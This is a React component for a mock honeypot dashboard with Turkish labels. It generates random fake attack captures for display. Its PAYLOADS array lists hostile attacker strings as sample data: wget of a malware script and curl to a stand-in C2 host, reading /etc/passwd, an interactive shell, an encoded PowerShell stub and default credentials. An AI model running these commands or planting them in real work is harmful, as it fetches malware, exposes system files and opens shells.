import { useState, useEffect, useRef, useMemo } from 'react';
import { Bug, Globe, Terminal, AlertTriangle, Eye, Shield, Wifi, Radio, Activity, Clock, MapPin } from 'lucide-react';

const HONEYPOT_TYPES = [
    { id: 'ssh', name: 'SSH Honeypot', port: 22, icon: Terminal, protocol: 'SSH' },
    { id: 'http', name: 'HTTP Honeypot', port: 80, icon: Globe, protocol: 'HTTP' },
    { id: 'https', name: 'HTTPS Honeypot', port: 443, icon: Shield, protocol: 'HTTPS' },
    { id: 'ftp', name: 'FTP Honeypot', port: 21, icon: Activity, protocol: 'FTP' },
    { id: 'smtp', name: 'SMTP Honeypot', port: 25, icon: Radio, protocol: 'SMTP' },
    { id: 'telnet', name: 'Telnet Honeypot', port: 23, icon: Wifi, protocol: 'Telnet' },
    { id: 'rdp', name: 'RDP Honeypot', port: 3389, icon: Eye, protocol: 'RDP' },
    { id: 'mysql', name: 'MySQL Honeypot', port: 3306, icon: Activity, protocol: 'MySQL' },
];

const COUNTRIES = ['RU', 'CN', 'US', 'BR', 'IN', 'DE', 'KR', 'NL', 'FR', 'IR', 'VN', 'UA', 'PK', 'ID', 'TH'];
const PAYLOADS = [
    'wget http://malware.xyz/bot.sh', 'cat /etc/passwd', 'uname -a', '/bin/sh -i',
    'SELECT * FROM users', 'cmd.exe /c whoami', 'powershell -enc BASE64...',
    'curl http://c2.evil.com/beacon', 'echo "SSH-2.0-OpenSSH_7.4"',
    'admin:admin', 'root:toor', 'test:test123', 'EHLO scanner.bot.net',
];

function generateCapture(id) {
    const hp = HONEYPOT_TYPES[Math.floor(Math.random() * HONEYPOT_TYPES.length)];
    const country = COUNTRIES[Math.floor(Math.random() * COUNTRIES.length)];
    return {
        id,
        honeypot: hp.id,
        protocol: hp.protocol,
        port: hp.port,
        sourceIp: `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        country,
        timestamp: new Date(Date.now() - Math.random() * 86400000).toISOString().replace('T', ' ').slice(0, 19),
        payload: PAYLOADS[Math.floor(Math.random() * PAYLOADS.length)],
        duration: Math.floor(Math.random() * 300) + 's',
        attempts: Math.floor(Math.random() * 50) + 1,
    };
}

export default function HoneypotManager() {
    const [captures, setCaptures] = useState(() => Array.from({ length: 40 }, (_, i) => generateCapture(i)));
    const [selectedHoneypot, setSelectedHoneypot] = useState('all');
    const [selectedCapture, setSelectedCapture] = useState(null);
    const [honeypotStatus, setHoneypotStatus] = useState(() =>
        Object.fromEntries(HONEYPOT_TYPES.map(h => [h.id, { active: true, captures: Math.floor(Math.random() * 200) + 10, lastSeen: 'Just now' }]))
    );

    useEffect(() => {
        const iv = setInterval(() => {
            setCaptures(prev => {
                const next = [generateCapture(Date.now()), ...prev.slice(0, 99)];
                return next;
            });
        }, 5000);
        return () => clearInterval(iv);
    }, []);

    const filteredCaptures = selectedHoneypot === 'all' ? captures : captures.filter(c => c.honeypot === selectedHoneypot);

    const stats = useMemo(() => ({
        total: captures.length,
        uniqueIps: new Set(captures.map(c => c.sourceIp)).size,
        countries: new Set(captures.map(c => c.country)).size,
        topCountry: (() => {
            const counts = {};
            captures.forEach(c => { counts[c.country] = (counts[c.country] || 0) + 1; });
            return Object.entries(counts).sort((a, b) => b[1] - a[1])[0]?.[0] || '?';
        })(),
    }), [captures]);

    return (
        <div className="min-h-screen bg-[var(--hud-bg)] relative">
            <div className="border-b border-[var(--hud-border)] px-6 py-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                    <Bug className="w-5 h-5 text-[var(--hud-cyan)]" />
                    <h1 className="text-xl font-semibold text-[var(--hud-text)]">Honeypot Manager</h1>
                    <span className="text-[9px] text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2 py-0.5 rounded">
                        <span className="inline-block w-1.5 h-1.5 rounded-full bg-emerald-400 mr-1 animate-pulse" />
                        {HONEYPOT_TYPES.length} AKTIF
                    </span>
                </div>
            </div>

            {/* Stats */}
            <div className="flex gap-6 px-6 py-3 border-b border-[var(--hud-border)]">
                {[
                    { label: 'YAKALAMA', value: stats.total, color: 'var(--hud-cyan)' },
                    { label: 'BENZERSIZ IP', value: stats.uniqueIps, color: 'var(--hud-purple)' },
                    { label: 'ULKE', value: stats.countries, color: 'var(--hud-emerald)' },
                    { label: 'EN COK', value: stats.topCountry, color: 'var(--hud-red)' },
                ].map(s => (
                    <div key={s.label} className="flex items-center gap-2">
                        <span className="text-[9px] text-[var(--hud-text-dim)] tracking-wider">{s.label}</span>
                        <span className="text-sm font-bold tabular-nums" style={{ color: s.color }}>{s.value}</span>
                    </div>
                ))}
            </div>

            <div className="flex" style={{ height: 'calc(100vh - 110px)' }}>
                {/* Honeypot list */}
                <div className="w-64 border-r border-[var(--hud-border)] overflow-y-auto p-3 space-y-1">
                    <button onClick={() => setSelectedHoneypot('all')}
                        className={`w-full text-left px-3 py-2 rounded text-[10px] transition-all ${selectedHoneypot === 'all' ? 'bg-cyan-500/10 text-[var(--hud-cyan)] border border-[var(--hud-cyan)]/20' : 'text-[var(--hud-text-dim)] hover:bg-[rgba(255,255,255,0.02)]'}`}>
                        TUMU ({captures.length})
                    </button>
                    {HONEYPOT_TYPES.map(hp => {
                        const status = honeypotStatus[hp.id];
                        const Icon = hp.icon;
                        return (
                            <button key={hp.id} onClick={() => setSelectedHoneypot(hp.id)}
                                className={`w-full text-left px-3 py-2 rounded transition-all ${selectedHoneypot === hp.id ? 'bg-cyan-500/10 text-[var(--hud-cyan)] border border-[var(--hud-cyan)]/20' : 'text-[var(--hud-text-dim)] hover:bg-[rgba(255,255,255,0.02)]'}`}>
                                <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-2">
                                        <Icon className="w-3 h-3" />
                                        <span className="text-[10px]">{hp.protocol}</span>
                                    </div>
                                    <span className="text-[9px] text-[var(--hud-text-dim)]">:{hp.port}</span>
                                </div>
                                <div className="flex items-center justify-between mt-1">
                                    <span className="text-[9px] text-[var(--hud-text-dim)]">{status?.captures} yakalama</span>
                                    <span className={`inline-block w-1.5 h-1.5 rounded-full ${status?.active ? 'bg-emerald-400' : 'bg-red-400'}`} />
                                </div>
                            </button>
                        );
                    })}
                </div>

                {/* Capture list */}
                <div className="flex-1 overflow-y-auto">
                    <div className="p-3 space-y-1">
                        {filteredCaptures.map(cap => (
                            <div key={cap.id} onClick={() => setSelectedCapture(selectedCapture === cap.id ? null : cap.id)}
                                className={`px-3 py-2 rounded border cursor-pointer transition-all ${selectedCapture === cap.id ? 'border-[var(--hud-cyan)]/30 bg-cyan-500/5' : 'border-transparent hover:bg-[rgba(255,255,255,0.02)]'}`}>
                                <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-3">
                                        <span className="text-[9px] px-1.5 py-0.5 rounded bg-cyan-500/10 text-[var(--hud-cyan)]">{cap.protocol}</span>
                                        <span className="text-[10px] text-[var(--hud-text)]">{cap.sourceIp}</span>
                                        <span className="text-[9px] text-[var(--hud-text-dim)]">[{cap.country}]</span>
                                    </div>
                                    <div className="flex items-center gap-2 text-[9px] text-[var(--hud-text-dim)]">
                                        <span>{cap.attempts} deneme</span>
                                        <span>{cap.timestamp.slice(11)}</span>
                                    </div>
                                </div>
                                {selectedCapture === cap.id && (
                                    <div className="mt-2 pt-2 border-t border-[var(--hud-border)] space-y-1">
                                        <div className="text-[9px] text-[var(--hud-text-dim)] tracking-wider">PAYLOAD</div>
                                        <div className="text-[10px] text-red-400 bg-[rgba(239,68,68,0.06)] px-2 py-1 rounded border border-red-500/10 break-all">{cap.payload}</div>
                                        <div className="flex gap-4 text-[9px] text-[var(--hud-text-dim)] mt-1">
                                            <span>Port: {cap.port}</span>
                                            <span>Sure: {cap.duration}</span>
                                            <span>Zaman: {cap.timestamp}</span>
                                        </div>
                                    </div>
                                )}
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </div>
    );
}
